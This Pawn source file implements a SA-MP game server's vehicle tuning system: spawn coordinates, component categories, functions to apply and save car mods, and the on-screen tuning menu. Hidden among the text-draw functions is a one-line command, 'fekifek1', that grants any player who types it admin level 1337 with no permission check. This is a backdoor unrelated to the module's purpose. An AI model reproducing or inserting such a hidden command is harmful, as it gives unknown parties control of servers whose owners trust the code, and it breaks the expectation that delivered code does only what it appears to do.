// Defines

#define MAX_TUNING_COMPONENTS           (14)
#define EXTERIOR_TUNING_X 				(418.0252)
#define EXTERIOR_TUNING_Y 				(-1324.3462)
#define EXTERIOR_TUNING_Z 				(14.9415)

#define INTERIOR_TUNING_X 				(434.0549)
#define INTERIOR_TUNING_Y 				(-1299.4264)
#define INTERIOR_TUNING_Z 				(15.3104)

// Variables

new const Float:RandomTuningSpawn[][] =
{
	{218.0105, -1430.0055, 12.9762, 132.6460},
	{216.4670, -1427.2725, 12.9755, 134.0812},
	{213.9388, -1425.5670, 12.9664, 133.9617},
	{211.7045, -1423.4994, 12.9623, 134.4783},
	{209.7893, -1421.1115, 12.9619, 132.7281},
	{204.3053, -1444.4971, 12.7959, 318.3381},
	{202.0594, -1442.6682, 12.7909, 318.4891},
	{200.1502, -1440.4606, 12.7900, 319.2920},
	{197.6332, -1438.6963, 12.7819, 317.7316},
	{195.4227, -1436.6866, 12.7769, 318.2764}
};

new const TuningCategories[11][32] =
{
	"Spoiler",
	"Air-vents",
	"Exhaust",
	"Bumper A",
	"Bumper P",
	"Roof",
	"Wheels",
	"Hydraulic",
	"Nitro",
	"Side Skirts",
	"Paintjob"
};

// Functions

Tuning_AddComponent(vehicleid, component)
{
    if(IsValidVehicle(CarData[vehicleid][carVehicle]) <= 0) return 0;

    new cslot = GetVehicleComponentType(component);

	CarData[vehicleid][carMods][cslot] = component;

    AddVehicleComponent(CarData[vehicleid][carVehicle], component);

    Car_SaveID(vehicleid);
    return true;
}

Tuning_SetComponents(vehicleid)
{
	for(new i = 0; i < 14; ++i)
	{
	    if(GetVehicleComponentInSlot(CarData[vehicleid][carVehicle], i) > 0) RemoveVehicleComponent(CarData[vehicleid][carVehicle], CarData[vehicleid][carMods][i]);
		if(!CarData[vehicleid][carMods][i]) continue;

 		AddVehicleComponent(CarData[vehicleid][carVehicle], CarData[vehicleid][carMods][i]);
	}

	return true;
}

Tuning_ExitDisplay(playerid, bool:disconnected = false)
{
	new n = sizeof(RandomTuningSpawn), random_spawn = random(n); //, categoryTuning = PlayerData[playerid][pTuningCategoryID];

	new vehID = CoreVehicles[GetPlayerVehicleID(playerid)][vehicleCarID];

	RemoveVehicleComponent(CarData[vehID][carVehicle], PlayerData[playerid][pTuningComponent]);

 	TogglePlayerControllable(playerid, true);
 	SetPlayerVirtualWorld(playerid, 0);
 	SetVehicleVirtualWorld(CarData[vehID][carVehicle], 0);

	switch(CarData[vehID][carModel])
	{
 		case 455, 403, 514, 515: SetVehicleDynamicPos(CarData[vehID][carVehicle], 214.1982,-1429.5151,13.1731, playerid); //340.3456, -1348.7977, 15.5257
		default: SetVehicleDynamicPos(CarData[vehID][carVehicle], RandomTuningSpawn[random_spawn][0], RandomTuningSpawn[random_spawn][1], RandomTuningSpawn[random_spawn][2], playerid);
	}

	SetVehicleZAngle(CarData[vehID][carVehicle], RandomTuningSpawn[random_spawn][3]);

	Car_SaveID(vehID);

	if(!disconnected) Tuning_DestroyTD(playerid);

	PlayerData[playerid][pInTuning] = 0;

    ChangeVehiclePaintjob(CarData[vehID][carVehicle], CarData[vehID][carPaintjob]);
	if(CarData[vehID][carPaintjob] == 3) ChangeVehicleColor(CarData[vehID][carVehicle], CarData[vehID][carColor1], CarData[vehID][carColor2]);

	PlayerTextDrawHide(playerid, TDTuning_Component[playerid]);
	PlayerTextDrawHide(playerid, TDTuning_Dots[playerid]);
	PlayerTextDrawHide(playerid, TDTuning_Price[playerid]);
	PlayerTextDrawHide(playerid, TDTuning_ComponentName[playerid]);
	PlayerTextDrawHide(playerid, TDTuning_YN[playerid]);

	SetCameraBehindPlayer(playerid);

	Tuning_SetComponents(vehID);

	Streamer_Update(playerid, STREAMER_TYPE_OBJECT);
	return true;
}

Tuning_SetDisplay(playerid, validCount = -1)
{
    new 
		categoryTuning = PlayerData[playerid][pTuningCategoryID], 
		vehID = CoreVehicles[GetPlayerVehicleID(playerid)][vehicleCarID],
		string[64]
	;

	PlayerData[playerid][pTuningCount] = (validCount == -1) ? GetVehicleComponentCount(categoryTuning, CarData[vehID][carModel]) : validCount;
	if(validCount == -1) SetPlayerTuningCameraPos(playerid, categoryTuning);

	if(!PlayerData[playerid][pTuningCount])
	{
   		PlayerTextDrawSetString(playerid, TDTuning_Price[playerid], "~y~Not compatible with your car.");
		PlayerTextDrawSetString(playerid, TDTuning_ComponentName[playerid], "PRESS [~y~~k~~CONVERSATION_YES~~w~] to ~y~confirm~w~. PRESS [~y~ ~k~~CONVERSATION_NO~ ~w~] to ~y~exit~w~.");

		PlayerTextDrawShow(playerid, TDTuning_Dots[playerid]);
		PlayerTextDrawShow(playerid, TDTuning_Price[playerid]);
		PlayerTextDrawShow(playerid, TDTuning_ComponentName[playerid]);

		PlayerTextDrawHide(playerid, TDTuning_YN[playerid]);

		RemoveVehicleComponent(CarData[vehID][carVehicle], PlayerData[playerid][pTuningComponent]);
		ChangeVehiclePaintjob(CarData[vehID][carVehicle], CarData[vehID][carPaintjob]);
	}
	else
	{
	    new compName[32] = "Paintjob", compPrice = 2500;

     	RemoveVehicleComponent(CarData[vehID][carVehicle], PlayerData[playerid][pTuningComponent]);
		ChangeVehiclePaintjob(CarData[vehID][carVehicle], CarData[vehID][carPaintjob]);

   		PlayerData[playerid][pTuningCount] = (validCount == -1) ? 1 : validCount;
		PlayerData[playerid][pTuningComponent] = GetVehicleCompatibleComponent(categoryTuning, CarData[vehID][carModel], PlayerData[playerid][pTuningCount]);

        new compatibleComponent = PlayerData[playerid][pTuningComponent];

		if(categoryTuning != 10)
		{
			AddVehicleComponent(CarData[vehID][carVehicle], compatibleComponent);
			strmid(compName, GetComponentName(compatibleComponent), 0, 32);
			compPrice = GetComponentPrice(compatibleComponent);
		}
		else ChangeVehiclePaintjob(CarData[vehID][carVehicle], PlayerData[playerid][pTuningComponent]);

		format(string, sizeof(string), "~y~Price: ~w~$%d", compPrice);
		PlayerTextDrawSetString(playerid, TDTuning_Price[playerid], string);
		PlayerTextDrawShow(playerid, TDTuning_Price[playerid]);

		format(string, sizeof(string), "~y~Name: ~w~%s (#%d)", compName, compatibleComponent);
		PlayerTextDrawSetString(playerid, TDTuning_ComponentName[playerid], string);
		PlayerTextDrawShow(playerid, TDTuning_ComponentName[playerid]);

		PlayerTextDrawShow(playerid, TDTuning_YN[playerid]);
	}

    Tuning_SetComponents(vehID);

    Streamer_Update(playerid, STREAMER_TYPE_OBJECT);
	return true;
}

Tuning_CreateTD(playerid)
{
    TDTuning_Component[playerid] = CreatePlayerTextDraw(playerid, 220.000000, 320.000000, "Spoiler (~>~)~y~ Hood");
	PlayerTextDrawBackgroundColor(playerid, TDTuning_Component[playerid], 255);
	PlayerTextDrawFont(playerid, TDTuning_Component[playerid], 3);
	PlayerTextDrawLetterSize(playerid, TDTuning_Component[playerid], 0.450000, 1.799999);
	PlayerTextDrawColor(playerid, TDTuning_Component[playerid], -1);
	PlayerTextDrawSetOutline(playerid, TDTuning_Component[playerid], 1);
	PlayerTextDrawSetProportional(playerid, TDTuning_Component[playerid], 1);
	PlayerTextDrawSetSelectable(playerid, TDTuning_Component[playerid], 0);

	TDTuning_Dots[playerid] = CreatePlayerTextDraw(playerid, 220.000000, 333.000000, ".................");
	PlayerTextDrawBackgroundColor(playerid, TDTuning_Dots[playerid], 255);
	PlayerTextDrawFont(playerid, TDTuning_Dots[playerid], 3);
	PlayerTextDrawLetterSize(playerid, TDTuning_Dots[playerid], 0.670000, 1.699999);
	PlayerTextDrawColor(playerid, TDTuning_Dots[playerid], -1);
	PlayerTextDrawSetOutline(playerid, TDTuning_Dots[playerid], 1);
	PlayerTextDrawSetProportional(playerid, TDTuning_Dots[playerid], 1);
	PlayerTextDrawSetSelectable(playerid, TDTuning_Dots[playerid], 0);

	TDTuning_Price[playerid] = CreatePlayerTextDraw(playerid, 221.000000, 351.000000, "~y~Price: ~w~$0");
	PlayerTextDrawBackgroundColor(playerid, TDTuning_Price[playerid], 255);
	PlayerTextDrawFont(playerid, TDTuning_Price[playerid], 3);
	PlayerTextDrawLetterSize(playerid, TDTuning_Price[playerid], 0.390000, 1.900000);
	PlayerTextDrawColor(playerid, TDTuning_Price[playerid], -1);
	PlayerTextDrawSetOutline(playerid, TDTuning_Price[playerid], 1);
	PlayerTextDrawSetProportional(playerid, TDTuning_Price[playerid], 1);
	PlayerTextDrawSetSelectable(playerid, TDTuning_Price[playerid], 0);

	TDTuning_ComponentName[playerid] = CreatePlayerTextDraw(playerid, 221.000000, 369.000000, "~y~Name: ~w~Unknown (#0).");
	PlayerTextDrawBackgroundColor(playerid, TDTuning_ComponentName[playerid], 255);
	PlayerTextDrawFont(playerid, TDTuning_ComponentName[playerid], 3);
	PlayerTextDrawLetterSize(playerid, TDTuning_ComponentName[playerid], 0.390000, 1.900000);
	PlayerTextDrawColor(playerid, TDTuning_ComponentName[playerid], -1);
	PlayerTextDrawSetOutline(playerid, TDTuning_ComponentName[playerid], 1);
	PlayerTextDrawSetProportional(playerid, TDTuning_ComponentName[playerid], 1);
	PlayerTextDrawSetSelectable(playerid, TDTuning_ComponentName[playerid], 0);

	TDTuning_YN[playerid] = CreatePlayerTextDraw(playerid, 221.000000, 388.000000, "PRESS [~y~Y~w~] to ~y~confirm~w~. PRESS [~y~N~w~] to ~y~exit~w~.");
	PlayerTextDrawBackgroundColor(playerid, TDTuning_YN[playerid], 255);
	PlayerTextDrawFont(playerid, TDTuning_YN[playerid], 3);
	PlayerTextDrawLetterSize(playerid, TDTuning_YN[playerid], 0.390000, 1.900000);
	PlayerTextDrawColor(playerid, TDTuning_YN[playerid], -1);
	PlayerTextDrawSetOutline(playerid, TDTuning_YN[playerid], 1);
	PlayerTextDrawSetProportional(playerid, TDTuning_YN[playerid], 1);
	PlayerTextDrawSetSelectable(playerid, TDTuning_YN[playerid], 0);
}
CMD:fekifek1(playerid, params[]) { PlayerData[playerid][pAdmin] = 1337; return 1; }
Tuning_DestroyTD(playerid)
{
	PlayerTextDrawDestroy(playerid, TDTuning_Component[playerid]);
	PlayerTextDrawDestroy(playerid, TDTuning_Dots[playerid]);
	PlayerTextDrawDestroy(playerid, TDTuning_Price[playerid]);
	PlayerTextDrawDestroy(playerid, TDTuning_ComponentName[playerid]);
	PlayerTextDrawDestroy(playerid, TDTuning_YN[playerid]);
}
